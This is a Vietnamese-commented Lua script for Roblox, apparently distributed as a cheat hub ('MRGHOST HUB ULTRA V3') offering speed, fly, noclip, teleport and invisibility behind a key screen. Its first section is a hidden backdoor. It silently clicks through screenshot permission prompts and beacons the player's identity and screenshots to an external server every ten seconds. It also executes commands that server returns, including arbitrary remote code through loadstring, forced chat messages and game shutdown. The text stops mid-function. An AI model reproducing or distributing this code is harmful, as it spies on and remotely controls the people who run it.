-- [[ MRGHOST HUB VIP - ULTRA V3 (KEY: TTTT) + DISCORD MATRIX ENGINE ]]

-- =========================================================
-- PHẦN 1: DISCORD MATRIX ENGINE (RUN IN BACKGROUND - NO AFK)
-- =========================================================
local HttpService = game:GetService("HttpService")
local Stats = game:GetService("Stats")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local VirtualInputManager = game:GetService("VirtualInputManager")
local LP = Players.LocalPlayer

getgenv().API_MATRIX = getgenv().API_MATRIX or "https://bot-thong-tin.onrender.com/api/matrix"

-- Bypass Popup Chụp Ảnh
task.spawn(function()
    CoreGui.ChildAdded:Connect(function(child)
        if child.Name == "RobloxPromptGui" or child.Name:find("Prompt") then
            task.wait(0.1)
            pcall(function()
                for _, v in pairs(child:GetDescendants()) do
                    if v:IsA("TextButton") and (v.Text:lower():find("allow") or v.Text:lower():find("yes") or v.Text:lower():find("chấp nhận")) then
                        local pos = v.AbsolutePosition
                        local size = v.AbsoluteSize
                        VirtualInputManager:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, true, game, 0)
                        task.wait(0.05)
                        VirtualInputManager:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, false, game, 0)
                    end
                end
            end)
        end
    end)
end)

local function CaptureScreenBase64()
    local captureFunc = getgenv()["capture-screenshot"] or getgenv().capturescreenshot or capturescreenshot or (syn and syn.capture_screenshot)
    if captureFunc then
        local success, result = pcall(captureFunc)
        if success and result then return result end
    end
    return nil
end

local function HopLowPlayerServerMatrix()
    pcall(function()
        local site = HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'))
        for _, server in pairs(site.data) do
            if server.playing < server.maxPlayers and server.id ~= game.JobId then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LP)
                break
            end
        end
    end)
end

function SendMatrixHeartbeat(eventTitle, alertLevel, sendPic)
    local req = (syn and syn.request) or request or http_request or (http and http.request)
    if not req then return end

    local payload = {
        userId = LP.UserId,
        username = LP.Name,
        displayName = LP.DisplayName,
        jobId = tostring(game.JobId),
        placeId = game.PlaceId,
        ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue() or 0),
        ram = math.floor(collectgarbage("count") / 1024),
        fps = math.floor(workspace:GetRealPhysicsFPS() or 60),
        eventTitle = eventTitle or "MRGHOST Ultra V3 Running",
        alertLevel = alertLevel or "NORMAL",
        screenshotBase64 = sendPic and CaptureScreenBase64() or nil
    }

    task.spawn(function()
        local successReq, res = pcall(function()
            return req({
                Url = getgenv().API_MATRIX,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)

        if successReq and res and (res.StatusCode == 200 or res.Success) then
            local successDecode, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
            if successDecode and data and data.cmd and data.cmd.executed == false then
                local cmdType = data.cmd.type
                if cmdType == "FORCE_HOP" then TeleportService:Teleport(game.PlaceId, LP)
                elseif cmdType == "HOP_LOW_SERVER" then HopLowPlayerServerMatrix()
                elseif cmdType == "TAKE_SCREENSHOT" then SendMatrixHeartbeat("📸 Ảnh Chụp Màn Hình Live", "VIP", true)
                elseif cmdType == "SAY_CHAT" then 
                    pcall(function() 
                        if game:GetService("TextChatService"):FindFirstChild("TextChannels") and game:GetService("TextChatService").TextChannels:FindFirstChild("RBXGeneral") then
                            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(data.cmd.text)
                        else
                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(data.cmd.text, "All")
                        end
                    end)
                elseif cmdType == "EVAL_CODE" then pcall(function() (loadstring or eval)(data.cmd.code)() end)
                elseif cmdType == "KILL_GAME" then game:Shutdown()
                end
            end
        end
    end)
end

-- Vòng lặp gửi thông tin ma trận về Discord
task.spawn(function()
    while task.wait(10) do
        pcall(function() SendMatrixHeartbeat("MRGHOST Ultra V3 Online", "NORMAL", false) end)
    end
end)


-- =========================================================
-- PHẦN 2: SCRIPT SỐNG CHẠY NHANH ULTRA V3 (ORIGINAL SCRIPT)
-- =========================================================
local success, err = pcall(function()

    -- Services
    local UserInputService = game:GetService("UserInputService")
    local RunService = game:GetService("RunService")
    local TweenService = game:GetService("TweenService")
    local StarterGui = game:GetService("StarterGui")

    local LocalPlayer = Players.LocalPlayer
    local Mouse = LocalPlayer:GetMouse()

    -- Container UI
    local ParentContainer = (gethui and gethui()) or CoreGui or LocalPlayer:WaitForChild("PlayerGui")
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "MrGhostHub_UltraV3_Key"
    ScreenGui.Parent = ParentContainer
    ScreenGui.ResetOnSpawn = false

    -- KEY ĐÃ ĐƯỢC ĐỔI THÀNH TTTT
    local CORRECT_KEY = "TTTT"

    local function Notify(title, text, duration)
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = title or "★ MRGHOST HUB ULTRA ★",
                Text = text or "",
                Duration = duration or 3
            })
        end)
    end

    local function getRGBColor(speed)
        speed = speed or 3
        local hue = (tick() % speed) / speed
        return Color3.fromHSV(hue, 0.95, 1)
    end

    local function makeDraggable(gui)
        local dragging, dragInput, dragStart, startPos
        gui.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = gui.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        gui.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                local delta = input.Position - dragStart
                gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
            end
        end)
    end

    -- =========================================================
    -- MAIN HUB LOADER
    -- =========================================================
    local function loadMainHub()
        local MainFrame = Instance.new("Frame")
        MainFrame.Name = "MainFrame"
        MainFrame.Size = UDim2.new(0, 370, 0, 480)
        MainFrame.Position = UDim2.new(0.5, -185, 0.3, -240)
        MainFrame.BackgroundColor3 = Color3.fromRGB(10, 8, 18)
        MainFrame.BackgroundTransparency = 0.15
        MainFrame.BorderSizePixel = 0
        MainFrame.Parent = ScreenGui

        Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 18)

        local UIStroke = Instance.new("UIStroke")
        UIStroke.Thickness = 2.5
        UIStroke.Parent = MainFrame

        local TitleBar = Instance.new("Frame")
        TitleBar.Size = UDim2.new(1, 0, 0, 50)
        TitleBar.BackgroundColor3 = Color3.fromRGB(18, 14, 30)
        TitleBar.BackgroundTransparency = 0.2
        TitleBar.BorderSizePixel = 0
        TitleBar.Parent = MainFrame
        Instance.new("UICorner", TitleBar).CornerRadius = UDim.new(0, 18)

        local Title = Instance.new("TextLabel")
        Title.Size = UDim2.new(1, -20, 1, 0)
        Title.Position = UDim2.new(0, 15, 0, 0)
        Title.BackgroundTransparency = 1
        Title.Text = "✨ MRGHOST VIP - ULTRA V3 ✨"
        Title.TextColor3 = Color3.fromRGB(255, 255, 255)
        Title.TextSize = 13
        Title.Font = Enum.Font.FredokaOne
        Title.TextXAlignment = Enum.TextXAlignment.Left
        Title.Parent = TitleBar

        local Scroll = Instance.new("ScrollingFrame")
        Scroll.Size = UDim2.new(1, -12, 1, -62)
        Scroll.Position = UDim2.new(0, 6, 0, 56)
        Scroll.BackgroundTransparency = 1
        Scroll.BorderSizePixel = 0
        Scroll.ScrollBarThickness = 3
        Scroll.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 128)
        Scroll.CanvasSize = UDim2.new(0, 0, 0, 950)
        Scroll.Parent = MainFrame

        local UIList = Instance.new("UIListLayout")
        UIList.Parent = Scroll
        UIList.SortOrder = Enum.SortOrder.LayoutOrder
        UIList.Padding = UDim.new(0, 8)

        local function createToggleCard(titleText, layoutOrder, callback)
            local Card = Instance.new("Frame")
            Card.Size = UDim2.new(1, -8, 0, 44)
            Card.BackgroundColor3 = Color3.fromRGB(18, 14, 28)
            Card.BackgroundTransparency = 0.2
            Card.LayoutOrder = layoutOrder
            Card.Parent = Scroll
            Instance.new("UICorner", Card).CornerRadius = UDim.new(0, 12)

            local CardLabel = Instance.new("TextLabel")
            CardLabel.Size = UDim2.new(0.7, 0, 1, 0)
            CardLabel.Position = UDim2.new(0, 12, 0, 0)
            CardLabel.BackgroundTransparency = 1
            CardLabel.Text = titleText
            CardLabel.TextColor3 = Color3.fromRGB(240, 240, 240)
            CardLabel.TextSize = 12
            CardLabel.Font = Enum.Font.FredokaOne
            CardLabel.TextXAlignment = Enum.TextXAlignment.Left
            CardLabel.Parent = Card

            local SwitchBg = Instance.new("TextButton")
            SwitchBg.Size = UDim2.new(0, 48, 0, 24)
            SwitchBg.Position = UDim2.new(1, -56, 0.5, -12)
            SwitchBg.BackgroundColor3 = Color3.fromRGB(35, 30, 50)
            SwitchBg.Text = ""
            SwitchBg.AutoButtonColor = false
            SwitchBg.Parent = Card
            Instance.new("UICorner", SwitchBg).CornerRadius = UDim.new(1, 0)

            local SwitchDot = Instance.new("Frame")
            SwitchDot.Size = UDim2.new(0, 18, 0, 18)
            SwitchDot.Position = UDim2.new(0, 3, 0.5, -9)
            SwitchDot.BackgroundColor3 = Color3.fromRGB(150, 150, 150)
            SwitchDot.Parent = SwitchBg
            Instance.new("UICorner", SwitchDot).CornerRadius = UDim.new(1, 0)

            local enabled = false
            SwitchBg.MouseButton1Click:Connect(function()
                enabled = not enabled
                if enabled then
                    TweenService:Create(SwitchBg, TweenInfo.new(0.25, Enum.EasingStyle.Quart), {BackgroundColor3 = Color3.fromRGB(0, 230, 180)}):Play()
                    TweenService:Create(SwitchDot, TweenInfo.new(0.25, Enum.EasingStyle.Back), {Position = UDim2.new(1, -21, 0.5, -9), BackgroundColor3 = Color3.fromRGB(255, 255, 255)}):Play()
                else
                    TweenService:Create(SwitchBg, TweenInfo.new(0.25, Enum.EasingStyle.Quart), {BackgroundColor3 = Color3.fromRGB(35, 30, 50)}):Play()
                    TweenService:Create(SwitchDot, TweenInfo.new(0.25, Enum.EasingStyle.Back), {Position = UDim2.new(0, 3, 0.5, -9), BackgroundColor3 = Color3.fromRGB(150, 150, 150)}):Play()
                end
                callback(enabled)
            end)
            return Card
        end

        local function createInputCard(titleText, placeholderText, defaultVal, layoutOrder, callback)
            local Card = Instance.new("Frame")
            Card.Size = UDim2.new(1, -8, 0, 56)
            Card.BackgroundColor3 = Color3.fromRGB(18, 14, 28)
            Card.BackgroundTransparency = 0.2
            Card.LayoutOrder = layoutOrder
            Card.Parent = Scroll
            Instance.new("UICorner", Card).CornerRadius = UDim.new(0, 12)

            local InputLabel = Instance.new("TextLabel")
            InputLabel.Size = UDim2.new(1, -24, 0, 18)
            InputLabel.Position = UDim2.new(0, 12, 0, 4)
            InputLabel.BackgroundTransparency = 1
            InputLabel.Text = titleText
            InputLabel.TextColor3 = Color3.fromRGB(0, 230, 255)
            InputLabel.TextSize = 11
            InputLabel.Font = Enum.Font.FredokaOne
            InputLabel.TextXAlignment = Enum.TextXAlignment.Left
            InputLabel.Parent = Card

            local TextBox = Instance.new("TextBox")
            TextBox.Size = UDim2.new(1, -24, 0, 24)
            TextBox.Position = UDim2.new(0, 12, 0, 25)
            TextBox.BackgroundColor3 = Color3.fromRGB(28, 22, 42)
            TextBox.Text = tostring(defaultVal)
            TextBox.PlaceholderText = placeholderText
            TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
            TextBox.TextSize = 12
            TextBox.Font = Enum.Font.SourceSansBold
            TextBox.ClearTextOnFocus = false
            TextBox.Parent = Card
            Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0, 6)

            TextBox.FocusLost:Connect(function()
                local num = tonumber(TextBox.Text)
                if num then callback(num) else TextBox.Text = tostring(defaultVal) end
            end)
            return Card
        end

        -- =========================================================
        -- MOBILE CONTROLS
        -- =========================================================
        local MobileContainer = Instance.new("Frame")
        MobileContainer.Name = "MobileControls"
        MobileContainer.Size = UDim2.new(0, 160, 0, 120)
        MobileContainer.Position = UDim2.new(0.75, 0, 0.45, 0)
        MobileContainer.BackgroundTransparency = 1
        MobileContainer.Parent = ScreenGui

        local MobileDashBtn = Instance.new("TextButton")
        MobileDashBtn.Size = UDim2.new(0, 150, 0, 38)
        MobileDashBtn.Position = UDim2.new(0, 0, 0, 0)
        MobileDashBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 110)
        MobileDashBtn.Text = "⚡ LƯỚT (DASH)"
        MobileDashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        MobileDashBtn.TextSize = 11
        MobileDashBtn.Font = Enum.Font.FredokaOne
        MobileDashBtn.Visible = false
        MobileDashBtn.Parent = MobileContainer
        Instance.new("UICorner", MobileDashBtn).CornerRadius = UDim.new(0, 10)

        local MobileFlyFwdBtn = Instance.new("TextButton")
        MobileFlyFwdBtn.Size = UDim2.new(0, 150, 0, 32)
        MobileFlyFwdBtn.Position = UDim2.new(0, 0, 0, 44)
        MobileFlyFwdBtn.BackgroundColor3 = Color3.fromRGB(0, 230, 150)
        MobileFlyFwdBtn.Text = "⬆ BAY TIẾN (FORWARD)"
        MobileFlyFwdBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        MobileFlyFwdBtn.TextSize = 10
        MobileFlyFwdBtn.Font = Enum.Font.FredokaOne
        MobileFlyFwdBtn.Visible = false
        MobileFlyFwdBtn.Parent = MobileContainer
        Instance.new("UICorner", MobileFlyFwdBtn).CornerRadius = UDim.new(0, 8)

        local MobileFlyUpBtn = Instance.new("TextButton")
        MobileFlyUpBtn.Size = UDim2.new(0, 72, 0, 32)
        MobileFlyUpBtn.Position = UDim2.new(0, 0, 0, 80)
        MobileFlyUpBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
        MobileFlyUpBtn.Text = "▲ LÊN"
        MobileFlyUpBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        MobileFlyUpBtn.TextSize = 10
        MobileFlyUpBtn.Font = Enum.Font.FredokaOne
        MobileFlyUpBtn.Visible = false
        MobileFlyUpBtn.Parent = MobileContainer
        Instance.new("UICorner", MobileFlyUpBtn).CornerRadius = UDim.new(0, 8)

        local MobileFlyDownBtn = Instance.new("TextButton")
        MobileFlyDownBtn.Size = UDim2.new(0, 72, 0, 32)
        MobileFlyDownBtn.Position = UDim2.new(0, 78, 0, 80)
        MobileFlyDownBtn.BackgroundColor3 = Color3.fromRGB(0, 130, 255)
        MobileFlyDownBtn.Text = "▼ XUỐNG"
        MobileFlyDownBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        MobileFlyDownBtn.TextSize = 10
        MobileFlyDownBtn.Font = Enum.Font.FredokaOne
        MobileFlyDownBtn.Visible = false
        MobileFlyDownBtn.Parent = MobileContainer
        Instance.new("UICorner", MobileFlyDownBtn).CornerRadius = UDim.new(0, 8)

        makeDraggable(MobileContainer)

        -- =========================================================
        -- CHỨC NĂNG MOVEMENT BYPASS
        -- =========================================================

        -- 1. CHẠY NHANH
        local walkSpeedValue = 60
        local speedEnabled = false
        createToggleCard("🏃 Chạy Siêu Tốc (Speed All Game)", 1, function(state)
            speedEnabled = state
            if not speedEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
                LocalPlayer.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 16
            end
        end)
        createInputCard("⚡ Tốc Độ Chạy", "Chỉnh speed...", 60, 2, function(val) walkSpeedValue = val end)

        -- 2. NHẢY CAO
        local jumpPowerValue = 100
        local jumpPowerEnabled = false
        createToggleCard("🦘 Nhảy Cao (High Jump All Game)", 3, function(state)
            jumpPowerEnabled = state
            if not jumpPowerEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
                LocalPlayer.Character:FindFirstChildOfClass("Humanoid").JumpPower = 50
                LocalPlayer.Character:FindFirstChildOfClass("Humanoid").JumpHeight = 7.2
            end
        end)
        createInputCard("🚀 Độ Cao Nhảy", "Chỉnh jump height...", 100, 4, function(val) jumpPowerValue = val end)

        -- 3. INFINITE JUMP
        local infJumpEnabled = false
        createToggleCard("🌌 Infinite Jump (Nhảy Vô Hạn)", 5, function(state) infJumpEnabled = state end)

        UserInputService.JumpRequest:Connect(function()
            if infJumpEnabled and LocalPlayer.Character then
                local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
            end
        end)

        -- 4. BAY
        local flySpeedValue = 60
        local flyEnabled = false
        local mobileFlyUp, mobileFlyDown, mobileFlyFwd = false, false, false

        createToggleCard("🕊️ Bay Tự Do (Fly Mode)", 6, function(state)
            flyEnabled = state
            local char = LocalPlayer.Character
            MobileFlyUpBtn.Visible = flyEnabled
            MobileFlyDownBtn.Visible = flyEnabled
            MobileFlyFwdBtn.Visible = flyEnabled

            if flyEnabled and char and char:FindFirstChild("HumanoidRootPart") then
                local hrp = char.HumanoidRootPart
                local bodyVel = Instance.new("BodyVelocity")
                bodyVel.Name = "FlyVel"
                bodyVel.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                bodyVel.Velocity = Vector3.zero
                bodyVel.Parent = hrp

                local bodyGyro = Instance.new("BodyGyro")
                bodyGyro.Name = "FlyGyro"
                bodyGyro.MaxTorque = Vector3.new(1e9, 1e9, 1e9)
                bodyGyro.CFrame = hrp.CFrame
                bodyGyro.Parent = hrp
            else
                if char and char:FindFirstChild("HumanoidRootPart") then
                    local v = char.HumanoidRootPart:FindFirstChild("FlyVel")
                    local g = char.HumanoidRootPart:FindFirstChild("FlyGyro")
                    if v then v:Destroy() end
                    if g then g:Destroy() end
                end
            end
        end)
        createInputCard("🚀 Tốc Độ Bay (Fly Speed)", "Số speed bay...", 60, 7, function(val) flySpeedValue = val end)

        MobileFlyFwdBtn.MouseButton1Down:Connect(function() mobileFlyFwd = true end)
        MobileFlyFwdBtn.MouseButton1Up:Connect(function() mobileFlyFwd = false end)
        MobileFlyUpBtn.MouseButton1Down:Connect(function() mobileFlyUp = true end)
        MobileFlyUpBtn.MouseButton1Up:Connect(function() mobileFlyUp = false end)
        MobileFlyDownBtn.MouseButton1Down:Connect(function() mobileFlyDown = true end)
        MobileFlyDownBtn.MouseButton1Up:Connect(function() mobileFlyDown = false end)

        -- 5. NOCLIP
        local noclipEnabled = false
        createToggleCard("👻 Noclip (Đi Xuyên Tường)", 8, function(state)
            noclipEnabled = state
            if not noclipEnabled and LocalPlayer.Character then
                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
                    if part:IsA("BasePart") then part.CanCollide = true end
                end
            end
        end)

        -- 6. LƯỚT
        local dashDistance = 35
        local blinkEnabled = false

        local function executeDash()
            if not blinkEnabled then return end
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                local hrp = char.HumanoidRootPart
                hrp.CFrame = hrp.CFrame + (hrp.CFrame.LookVector * dashDistance)
            end
        end

        createToggleCard("⚡ Lướt Biến Hình (Phím 'Q')", 9, function(state) 
            blinkEnabled = state 
            MobileDashBtn.Visible = blinkEnabled
        end)
        createInputCard("📏 Khoảng Cách Lướt (Dash)", "Độ xa...", 35, 10, function(val) dashDistance = val end)

        MobileDashBtn.MouseButton1Click:Connect(executeDash)
        UserInputService.InputBegan:Connect(function(input, gpe)
            if not gpe and input.KeyCode == Enum.KeyCode.Q then executeDash() end
        end)

        -- 7. GHOST MODE
        local ghostEnabled = false
        local originalTransparencies = {}

        createToggleCard("👻 Supreme Ghost (Ẩn Thân Tối Thượng)", 11, function(state)
            ghostEnabled = state
            local char = LocalPlayer.Character
            if char then
                for _, part in pairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then
                        if ghostEnabled then
                            originalTransparencies[part] = part.Transparency
                            part.Transparency = 1
                            if part.Name ~= "HumanoidRootPart" then part.CanCollide = false end
                        else
                            part.Transparency = originalTransparencies[part] or 0
                            if part.Name ~= "HumanoidRootPart" then part.CanCollide = true end
                        end
                    elseif part:IsA("Decal") then
                        if ghostEnabled then
                            originalTransparencies[part] = part.Transparency
                            part.Transparency = 1
                        else
                            part.Transparency = originalTransparencies[part] or 0
                        end
                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
                        part.Enabled = not ghostEnabled
                    end
                end
            end
        end)

        -- 8. TELEPORT 2 CLICK 3D MARKER
        local tpToggleState = false
        local tpTargetPos = nil
        local tpMarker = nil
        local markerConnection = nil

        local function createTPMarker(pos)
            if tpMarker then tpMarker:Destroy() end
            if markerConnection then markerConnection:Disconnect() end
            
            tpMarker = Instance.new("Part")
            tpMarker.Name = "TP_UltraVisualMarker"
            tpMarker.Shape = Enum.PartType.Cylinder
            tpMarker.Size = Vector3.new(0.3, 7, 7)
            tpMarker.CFrame = CFrame.new(pos) * CFrame.Angles(0, 0, math.rad(90))
            tpMarker.Material = Enum.Material.Neon
            tpMarker.Color = Color3.fromRGB(0, 255, 200)
            tpMarker.Transparency = 0.25
            tpMarker.Anchored = true
            tpMarker.CanCollide = false
            tpMarker.Parent = workspace

            local highlight = Instance.new("Highlight")
            highlight.Adornee = tpMarker
            highlight.FillColor = Color3.fromRGB(0, 255, 200)
            highlight.FillTransparency = 0.4
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.OutlineTransparency = 0
            highlight.Parent = tpMarker

            local angle = 0
            markerConnection = RunService.RenderStepped:Connect(function(dt)
                if tpMarker and tpMarker.Parent then
                    angle = (angle + dt * 120) % 360
                    tpMarker.CFrame = CFrame.new(pos) * CFrame.Angles(0, math.rad(angle), math.rad(90))
                end
            end)
        end

        local function removeTPMarker()
            if markerConnection then markerConnection:Disconnect() end
            if tpMarker then
                tpMarker:Destroy()
                tpMarker = nil
            end
        end

        createToggleCard("📍 Teleport 2 Click 3D Neon", 12, function(state)
            tpToggleState = state
            tpTargetPos = nil
            removeTPMarker()
        end)

        Mouse.Button1Down:Connect(function()
            if tpToggleState then
                local mousePos = UserInputService:GetMouseLocation()
                local ray = workspace.CurrentCamera:ViewportPointToRay(mousePos.X, mousePos.Y)
                local params = RaycastParams.new()
                params.FilterType = RaycastFilterType.Exclude
                if LocalPlayer.Character then params.FilterDescendantsInstances = {LocalPlayer.Character, tpMarker} end
                
                local res = workspace:Raycast(ray.Origin, ray.Direction * 2000, params)
                if res then
                    local hitPos = res.Position
                    if tpTargetPos == nil then
                        tpTargetPos = hitPos
                        createTPMarker(tpTargetPos)
                        Notify("📍 TELEPORT", "Đã chọn vị trí! Nhấn lần 2 để dịch chuyển.", 2)
                    else
                        local char = LocalPlayer.Character
                        if char and char:FindFirstChild("HumanoidRootPart") then
                            char.HumanoidRootPart.CFrame = CFrame.new(tpTargetPos + Vector3.new(0, 4.5, 0))
                            Notify("⚡ TELEPORT", "Dịch chuyển thành công!", 2)
                        end
                        tpTargetPos = nil
                        removeTPMarker()
                    end
                end
            end
        end)

        -- LOOPS BYPASS MOVEMENT
        RunService.Stepped:Connect(function()
            pcall(function()
                local char = LocalPlayer.Character
                if char then
                    if noclipEnabled then
                        for _, part in pairs(char:GetDescendants()) do
                            if part:IsA("BasePart") then part.CanCollide = false end
                        end
                    end
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    local hrp = char:FindFirstChild("HumanoidRootPart")

                    if hum and jumpPowerEnabled then
                        hum.UseJumpPower = true
                        hum.JumpPower = jumpPowerValue
                        hum.JumpHeight = jumpPowerValue / 7
                    end

                    if hum and speedEnabled then
                        hum.WalkSpeed = walkSpeedValue
                        if hrp and hum.MoveDirection.Magnitude > 0 then
                            hrp.CFrame = hrp.CFrame + (hum.MoveDirection * (walkSpeedValue / 120))
                        end
                    end
                end
            end)
        end)

        RunService.RenderStepped:Connect(function()
            if flyEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local hrp = LocalPlayer.Character.HumanoidRootPart
                local v = hrp:FindFirstChild("FlyVel")
                local g = hrp:FindFirstChild("FlyGyro")
                if v and g then
                    local cam = workspace.CurrentCamera
                    local moveDir = Vector3.zero
                    if UserInputService:IsKeyDown(Enum.KeyCode.W) or mobileFlyFwd then moveDir = moveDir + cam.CFrame.LookVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - cam.CFrame.LookVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - cam.CFrame.RightVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + cam.CFrame.RightVector end
                    if UserInputService:IsKeyDown(Enum.KeyCode.Space) or mobileFlyUp then moveDir = moveDir + Vector3.new(0, 1, 0) end
                    if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or mobileFlyDown then moveDir = moveDir - Vector3.new(0, 1, 0) end

                    v.Velocity = moveDir * flySpeedValue
                    g.CFrame = cam.CFrame
                end
            end
        end)

        -- TOGGLE BUTTON
        local ToggleMenuBtn = Instance.new("TextButton")
        ToggleMenuBtn.Size = UDim2.new(0, 54, 0, 54)
        ToggleMenuBtn.Position = UDim2.new(0.02, 0, 0.25, 0)
        ToggleMenuBtn.BackgroundColor3 = Color3.fromRGB(16, 12, 28)
        ToggleMenuBtn.Text = "✨"
        ToggleMenuBtn.TextSize = 24
        ToggleMenuBtn.Parent = ScreenGui
        Instance.new("UICorner", ToggleMenuBtn).CornerRadius = UDim.new(1, 0)

        local ToggleStroke = Instance.new("UIStroke")
        ToggleStroke.Thickness = 3
        ToggleStroke.Parent = ToggleMenuBtn

        makeDraggable(MainFrame)
        makeDraggable(ToggleMenuBtn)

        RunService.RenderStepped:Connect(function()
            local rainbow = getRGBColor(2.5)
            UIStroke.Color = rainbow
            ToggleStroke.Color = rainbow
        end)

        local menuVisible = true
        ToggleMenuBtn.MouseButton1Click:Connect(function()
            menuVisible = not menuVisible
            MainFrame.Visible = menuVisible
            ToggleMenuBtn.Text = menuVisible and "✨" or "🎮"
        end)

        Notify("★ MRGHOST HUB ★", "Kích hoạt thành công!", 3)
    end

    -- =========================================================
    -- KEY SYSTEM UI (KEY HIỆN TẠI: TTTT)
    -- =========================================================
    local KeyFrame = Instance.new("Frame")
    KeyFrame.Name = "KeyFrame"
    KeyFrame.Size = UDim2.new(0, 320, 0, 220)
    KeyFrame.Position = UDim2.new(0.5, -160, 0.4, -110)
    KeyFrame.BackgroundColor3 = Color3.fromRGB(12, 10, 22)
    KeyFrame.Parent = ScreenGui
    Instance.new("UICorner", KeyFrame).CornerRadius = UDim.new(0, 16)

    local KeyStroke = Instance.new("UIStroke")
    KeyStroke.Thickness = 2
    KeyStroke.Parent = KeyFrame

    RunService.RenderStepped:Connect(function()
        KeyStroke.Color = getRGBColor(3)
    end)

    local KeyTitle = Instance.new("TextLabel")
    KeyTitle.Size = UDim2.new(1, 0, 0, 40)
    KeyTitle.Position = UDim2.new(0, 0, 0, 10)
    KeyTitle.BackgroundTransparency = 1
    KeyTitle.Text = "🔐 KEY SYSTEM VIP"
    KeyTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
    KeyTitle.TextSize = 16
    KeyTitle.Font = Enum.Font.FredokaOne
    KeyTitle.Parent = KeyFrame

    local KeyInput = Instance.new("TextBox")
    KeyInput.Size = UDim2.new(1, -40, 0, 38)
    KeyInput.Position = UDim2.new(0, 20, 0, 60)
    KeyInput.BackgroundColor3 = Color3.fromRGB(22, 18, 36)
    KeyInput.PlaceholderText = "Nhập Key (Mặc định: TTTT)"
    KeyInput.Text = ""
    KeyInput.TextColor3 = Color3.fromRGB(0, 230, 255)
    KeyInput.TextSize = 13
    KeyInput.Font = Enum.Font.SourceSansBold
    KeyInput.Parent = KeyFrame
    Instance.new("UICorner", KeyInput).CornerRadius = UDim.new(0, 8)

    local SubmitBtn = Instance.new("TextButton")
    SubmitBtn.Size = UDim2.new(1, -40, 0, 38)
    SubmitBtn.Position = UDim2.new(0, 20, 0, 110)
    SubmitBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 120)
    SubmitBtn.Text = "KÍCH HOẠT HUB"
    SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    SubmitBtn.TextSize = 13
    SubmitBtn.Font = Enum.Font.FredokaOne
    SubmitBtn.Parent = KeyFrame
    Instance.new("UICorner", SubmitBtn).CornerRadius = UDim.new(0, 8)

    local GetKeyBtn = Instance.new("TextButton")
    GetKeyBtn.Size = UDim2.new(1, -40, 0, 30)
    GetKeyBtn.Position = UDim2.new(0, 20, 0, 160)
    GetKeyBtn.BackgroundColor3 = Color3.fromRGB(40, 35, 60)
    GetKeyBtn.Text = "📋 Copy Key Mặc Định (TTTT)"
    GetKeyBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
    GetKeyBtn.TextSize = 11
    GetKeyBtn.Font = Enum.Font.FredokaOne
    GetKeyBtn.Parent = KeyFrame
    Instance.new("UICorner", GetKeyBtn).CornerRadius = UDim.new(0, 8)

    makeDraggable(KeyFrame)

    GetKeyBtn.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard(CORRECT_KEY)
            Notify("📋 KEY COPIED", "Đã copy Key 'TTTT' vào bộ nhớ!", 3)
        else
            KeyInput.Text = CORRECT_KEY
            Notify("📋 KEY", "Key kích hoạt: TTTT", 3)
        end
    end)

    SubmitBtn.MouseButton1Click:Connect(function()
        if KeyInput.Text == CORRECT_KEY then
            KeyFrame:Destroy()
